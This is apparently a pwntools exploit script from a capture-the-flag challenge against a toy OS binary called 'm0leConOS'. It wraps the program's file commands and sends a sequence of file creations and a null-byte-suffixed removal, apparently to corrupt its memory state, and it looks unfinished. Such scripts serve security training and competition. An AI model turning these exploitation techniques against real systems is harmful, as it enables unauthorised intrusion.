#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("m0leConOS")
#libc = ELF("./libc.so.6")
#ld = ELF("./ld-2.27.so")

local = True 
if local:
    p = process("./m0leConOS")
    gdb.attach(p,'''c''')
else:
    p = remote('m0leconos.challs.m0lecon.it', 6745)

elf = context.binary = ELF('./m0leConOS', checksec=False)

def touch(file,data):
    p.sendlineafter(b"#", b"touch")
    p.sendlineafter(b"Filename:", file)
    p.sendlineafter(b">", data)
    print("===== TOUCH_FILE =====")

def rm(file):
    p.sendlineafter(b"#", b"rm")
    p.sendlineafter(b":", file)
    print("===== RM_FILE =====")

def cat(file):
    p.sendlineafter(b"#", b"m0lecat")
    p.sendlineafter(b">", file)
    p.sendline(b"")
    print("===== CAT_FILE =====")

def cp(file, to_file):
    p.sendlineafter(b"#", b"cp")
    p.sendlineafter(b"from:", file)
    p.sendlineafter(b"to:", to_file)
    print("===== CP_FILE =====")

cat(b"flag.txt")
touch(b"fake1", b"khanhne")
touch(b"fake2", b"khanhne")
touch(b"fake3", b"khanhne")
touch(b"fake4", b"khanhne")
touch(b"fake5", b"khanhne")
touch(b"fake6", b"khanhne")
touch(b"fake7", b"khanhne")
touch(b"fake8", b"khanhne")
touch(b"fake9", b"khanhne")
rm(b"fake9" + p64(0x0))
#rm(b"fake\n")





p.interactive()